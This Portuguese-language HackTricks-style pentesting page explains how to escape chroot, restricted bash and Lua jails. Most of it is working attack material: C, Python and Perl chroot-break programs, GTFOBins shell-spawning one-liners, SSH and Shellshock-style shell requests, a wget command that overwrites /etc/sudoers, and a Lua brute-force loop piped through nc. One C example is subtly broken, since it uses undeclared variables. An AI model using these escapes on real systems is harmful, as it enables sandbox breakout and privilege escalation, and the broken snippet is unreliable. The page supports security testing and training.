# Escaping de Jails

{{#include ../../banners/hacktricks-training.md}}

## **GTFOBins**

**Procure em** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **se você pode executar qualquer binary com a propriedade "Shell"**

## Escapes de Chroot

Da [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): O mecanismo chroot **não tem como objetivo se defender** contra adulterações intencionais realizadas por **usuários** (**root**) **privilegiados**. Na maioria dos sistemas, os contextos chroot não são empilhados corretamente, e programas em chroot **com privilégios suficientes podem executar um segundo chroot para escapar**.\
Normalmente, isso significa que, para escapar, você precisa ser root dentro do chroot.<sup>[[4]](#references)</sup>

> [!TIP]
> A **tool** [**chw00t**](https://github.com/earthquake/chw00t) foi criada para abusar dos seguintes cenários e escapar de `chroot`.<sup>[[1]](#references)[[5]](#references)</sup>

### Root + CWD

> [!WARNING]
> Se você é **root** dentro de um chroot, você **pode escapar** criando **outro chroot**. Isso ocorre porque 2 chroots não podem coexistir (no Linux); portanto, se você criar uma pasta e então **criar um novo chroot** nessa nova pasta enquanto **está fora dela**, você estará agora **fora do novo chroot** e, portanto, estará no FS.
>
> Isso ocorre porque normalmente o chroot NÃO move seu diretório de trabalho para o local indicado; assim, você pode criar um chroot, mas permanecer fora dele.<sup>[[4]](#references)[[5]](#references)</sup>

Normalmente, você não encontrará o binary `chroot` dentro de um chroot jail, mas **poderia compilar, fazer upload e executar** um binary:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Saved fd

> [!WARNING]
> Isso é semelhante ao caso anterior, mas, neste caso, o **attacker armazena um file descriptor para o diretório atual** e então **cria o chroot em uma nova pasta**. Por fim, como ele tem **acesso** a esse **FD** **fora** do chroot, ele o acessa e **escapes**.<sup>[[4]](#references)[[5]](#references)</sup>

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

> [!WARNING]
> O FD pode ser passado por Unix Domain Sockets, então:
>
> - Crie um processo filho (fork)
> - Crie um UDS para que o processo pai e o filho possam se comunicar
> - Execute o chroot no processo filho, em uma pasta diferente
> - No processo pai, crie um FD de uma pasta que esteja fora do novo chroot do processo filho
> - Passe esse FD para o processo filho usando o UDS
> - O processo filho executará chdir nesse FD e, como ele está fora do chroot, escapará do jail.<sup>[[5]](#references)[[6]](#references)</sup>

### Root + Mount

> [!WARNING]
>
> - Monte o dispositivo raiz (/) em um diretório dentro do chroot
> - Execute o chroot nesse diretório
>
> Isso é possível no Linux.<sup>[[5]](#references)</sup>

### Root + /proc

> [!WARNING]
>
> - Monte o procfs em um diretório dentro do chroot (caso ainda não esteja montado)
> - Procure um pid que tenha uma entrada root/cwd diferente, como: /proc/1/root
> - Execute o chroot nessa entrada.<sup>[[4]](#references)[[5]](#references)[[7]](#references)</sup>

### Root(?) + Fork

> [!WARNING]
>
> - Crie um Fork (processo filho), execute o chroot em uma pasta diferente, mais profunda no FS, e execute CD nela
> - A partir do processo pai, mova a pasta onde o processo filho está para uma pasta anterior ao chroot do processo filho
> - Esse processo filho se encontrará fora do chroot.<sup>[[5]](#references)</sup>

### ptrace

> [!WARNING]
>
> - A possibilidade de um processo se conectar com `ptrace` depende de credenciais, capabilities e módulos de segurança habilitados, como o Yama; portanto, a depuração pelo mesmo usuário pode ser restringida pela política do sistema.<sup>[[8]](#references)</sup>
> - Se a conexão for permitida, você poderá usar ptrace em um processo e executar um shellcode dentro dele ([veja este exemplo](../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace)).<sup>[[5]](#references)[[8]](#references)</sup>

## Bash Jails

### Enumeração

Obtenha informações sobre o jail:
```bash
echo $0
echo $SHELL
echo $PATH
env
export
pwd
set -o
compgen -c | sort -u
enable -a
type -a bash sh rbash ssh vi vim less more man awk find tar zip git scp script 2>/dev/null
```
### Modificar PATH

Verifique se você pode modificar a variável de ambiente PATH.<sup>[[2]](#references)</sup>
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### Usando vim

Se o Vim estiver disponível, defina sua opção `shell` como um shell que você possa executar e invoque `:shell`.<sup>[[10]](#references)</sup>
```bash
:set shell=/bin/sh
:shell
```
### Pagers e visualizadores de ajuda

Muitos ambientes restritos ainda deixam **pagers** ou **visualizadores de ajuda** disponíveis. Geralmente, é mais rápido abusar deles do que tentar reconstruir o `PATH`.
```bash
less /etc/hosts
!/bin/sh

man man
!/bin/sh

man '-H/bin/sh #' man
```
Se `git` estiver disponível, sua opção `--paginate` envia a saída para `less` ou `$PAGER`, o que é útil quando um pager escape está disponível.<sup>[[9]](#references)</sup>
```bash
PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
# Or: git help config
# Then inside the pager: !/bin/sh
```
### One-liners comuns do GTFOBins

Depois de saber quais binários estão acessíveis, teste primeiro os shell spawners óbvios:
```bash
awk 'BEGIN {system("/bin/sh")}'
find . -exec /bin/sh \; -quit
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
zip /tmp/zip.zip /etc/hosts -T --unzip-command='sh -c /bin/sh'
script /dev/null -c bash
ssh localhost /bin/sh
```
Se você só puder **injetar argumentos** em um comando permitido (em vez de executá-lo livremente), verifique também o **GTFOArgs**.<sup>[[17]](#references)</sup>

### Criar script

Verifique se você pode criar um arquivo executável com _/bin/bash_ como conteúdo
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### Obter bash via SSH

Se você estiver acessando via SSH, geralmente pode solicitar ao servidor que execute um **programa diferente** em vez do login shell restrito.<sup>[[14]](#references)</sup>
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "/bin/sh"
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
Se `ssh` for um dos poucos binários permitidos localmente, lembre-se de que ele também pode ser abusado como um **GTFOBin**; suas opções `LocalCommand` e `ProxyCommand` executam comandos auxiliares configurados localmente.<sup>[[14]](#references)[[15]](#references)</sup>
```bash
ssh localhost /bin/sh
ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
```
### Declare

No Bash, um nameref redireciona atribuições para outra variável, enquanto adicionar um elemento a `BASH_CMDS` adiciona esse comando à tabela hash interna de comandos do Bash.<sup>[[11]](#references)[[12]](#references)</sup>
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

A opção `-O` do Wget grava o conteúdo baixado no arquivo de saída especificado; se esse caminho tiver permissão de escrita, isso poderá sobrescrever um arquivo como `/etc/sudoers`.<sup>[[13]](#references)</sup>
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Restricted shell wrappers (`git-shell`, `rssh`, `lshell`)

Alguns ambientes não colocam você em um `rbash` simples, mas em **wrappers** como `git-shell`, `rssh` ou `lshell`:

- `git-shell` aceita apenas comandos Git do lado do servidor, além de qualquer coisa presente dentro de `~/git-shell-commands/`. Se esse diretório existir, execute `help` para enumerar as ações personalizadas permitidas. Se você puder **escrever** nesse diretório, qualquer executável colocado nele se tornará acessível.<sup>[[3]](#references)</sup>
- `rssh` / `lshell` normalmente permitem apenas operações com `scp`, `sftp`, `rsync` ou no estilo Git. Nesses casos, concentre-se primeiro em **primitivas de escrita de arquivos**: faça upload de `authorized_keys`, de um arquivo de inicialização do shell ou de um script auxiliar para um local gravável e depois reconecte-se com `ssh -t ...`.
- Se o wrapper apenas filtra a linha de comando, enumere os binários acessíveis e então recorra ao **GTFOBins / GTFOArgs**.

### Outros truques

Verifique também:

- [**Fireshell Security - Restricted Linux Shell Escaping Techniques**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)
- [**SANS - Escaping Restricted Linux Shells**](https://www.sans.org/blog/escaping-restricted-linux-shells)
- [**GTFOBins**](https://gtfobins.org/)
- [**GTFOArgs**](https://gtfoargs.github.io/)

**A página a seguir também pode ser interessante:**

{{#ref}}
../linux-basics/bypass-linux-restrictions/
{{#endref}}

## Python Jails

Truques sobre como escapar de Python jails na página a seguir:


{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

## Lua Jails

Nesta página, você pode encontrar as funções globais às quais tem acesso dentro do Lua: [https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base).<sup>[[16]](#references)</sup>

As funções padrão `load`, `string.char` e `os.execute` podem construir e executar este chunk quando estiverem disponíveis.<sup>[[16]](#references)</sup>
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
Uma função de tabela também pode ser obtida com `rawget` em vez da sintaxe de ponto.<sup>[[16]](#references)</sup>
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
Use `pairs` para enumerar uma tabela de biblioteca.<sup>[[16]](#references)</sup>
```bash
for k,v in pairs(string) do print(k,v) end
```
A ordem na qual `pairs` enumera os índices da tabela não é especificada, portanto, não dependa de uma função específica aparecer primeiro. Se precisar executar uma função específica, você pode realizar um brute force attack carregando diferentes ambientes Lua e chamando a primeira função da library.<sup>[[16]](#references)</sup>
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Obter um shell lua interativo**: Se você estiver dentro de um shell lua limitado, poderá obter um novo shell lua (e, esperançosamente, ilimitado) chamando `debug.debug()`, que entra em um modo interativo.<sup>[[16]](#references)</sup>
```bash
debug.debug()
```
## References

- [1] [Chw00t: Como escapar de várias soluções chroot (Bucsay Balazs, palestra e slides da DeepSec)](https://www.youtube.com/watch?v=UO618TeyCWo)
- [2] [Manual de Referência do GNU Bash – The Restricted Shell](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html)
- [3] [git-shell – Documentação do Git](https://git-scm.com/docs/git-shell)
- [4] [chroot(2) – página do manual do Linux](https://man7.org/linux/man-pages/man2/chroot.2.html)
- [5] [chw00t – ferramenta de escape de chroot](https://github.com/earthquake/chw00t)
- [6] [unix(7) – página do manual do Linux](https://man7.org/linux/man-pages/man7/unix.7.html)
- [7] [proc_pid_root(5) – página do manual do Linux](https://man7.org/linux/man-pages/man5/proc_pid_root.5.html)
- [8] [ptrace(2) – página do manual do Linux](https://man7.org/linux/man-pages/man2/ptrace.2.html)
- [9] [git – Documentação do Git](https://git-scm.com/docs/git)
- [10] [:shell – documentação do Vim](https://vimhelp.org/various.txt.html#%3Ashell)
- [11] [Builtins do Bash – Manual de Referência do GNU Bash](https://www.gnu.org/software/bash/manual/html_node/Bash-Builtins.html)
- [12] [Variáveis do Bash – Manual de Referência do GNU Bash](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
- [13] [Manual do GNU Wget](https://www.gnu.org/software/wget/manual/wget.html)
- [14] [ssh(1) – página do manual do OpenBSD](https://man.openbsd.org/ssh)
- [15] [ssh_config(5) – página do manual do OpenBSD](https://man.openbsd.org/ssh_config)
- [16] [Manual de Referência do Lua 5.4](https://www.lua.org/manual/5.4/manual.html)
- [17] [GTFOArgs: Lista de vetores de exploração de Argument Injection](https://gtfoargs.github.io/)
{{#include ../../banners/hacktricks-training.md}}
